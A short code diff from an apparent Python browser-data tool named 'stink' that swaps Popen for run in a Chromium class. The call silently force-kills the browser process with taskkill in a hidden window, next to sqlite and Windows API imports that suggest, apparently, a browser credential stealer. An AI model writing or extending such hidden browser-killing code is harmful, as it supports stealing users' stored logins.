@@ -6,7 +6,7 @@ from typing import Tuple, List
 from datetime import datetime, timedelta
 from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
-from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE
+from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE
 
 from stink.enums.features import Features
 from stink.helpers.config import ChromiumConfig
@@ -40,7 +40,7 @@ class Chromium:
         Returns:
         - None.
         """
-        Popen(
+        run(
             f"taskkill /f /im {self.__process_name}",
             shell=True,
             creationflags=CREATE_NEW_CONSOLE | SW_HIDE
